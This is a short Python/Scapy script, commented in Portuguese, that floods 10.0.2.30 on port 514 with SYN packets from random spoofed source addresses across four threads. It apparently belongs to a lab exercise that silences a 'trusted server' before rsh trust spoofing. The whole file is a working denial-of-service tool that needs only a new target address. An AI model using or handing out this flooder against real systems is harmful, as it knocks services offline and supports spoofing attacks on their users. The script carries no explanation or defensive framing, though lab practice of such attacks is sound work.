import time
import threading
from scapy.all import IP, TCP, RandInt, RandShort, send

TARGET_IP = "10.0.2.30"
TARGET_PORT = 514
FLOOD_DURATION = 10  # segundos
NUM_THREADS = 4


def syn_flood(thread_id: int, stop_event: threading.Event, counter: list) -> None:
    while not stop_event.is_set():
        # IP de origem aleatório para encher a tabela de half-open connections
        packet = IP(dst=TARGET_IP, src=f"10.0.{int(RandShort()) % 254 + 1}.{int(RandShort()) % 254 + 1}") / TCP(
            sport=RandShort(),
            dport=TARGET_PORT,
            flags="S",
            seq=RandInt(),
        )
        send(packet, verbose=False)
        counter[thread_id] += 1


def main():
    print(f"[*] Iniciando SYN Flood em {TARGET_IP}:{TARGET_PORT} por {FLOOD_DURATION}s...")

    stop_event = threading.Event()
    counters = [0] * NUM_THREADS
    threads = [
        threading.Thread(target=syn_flood, args=(i, stop_event, counters), daemon=True)
        for i in range(NUM_THREADS)
    ]

    start = time.time()
    for t in threads:
        t.start()

    try:
        while time.time() - start < FLOOD_DURATION:
            elapsed = time.time() - start
            total = sum(counters)
            print(f"\r[*] {elapsed:.1f}s | Pacotes enviados: {total}", end="", flush=True)
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[!] Interrompido pelo usuário.")

    stop_event.set()
    for t in threads:
        t.join()

    total = sum(counters)
    elapsed = time.time() - start
    print(f"\n[+] Flood concluído: {total} pacotes em {elapsed:.1f}s ({total/elapsed:.0f} pkt/s)")
    print(f"[+] Servidor Confiável ({TARGET_IP}) deve estar sobrecarregado.")


if __name__ == "__main__":
    main()
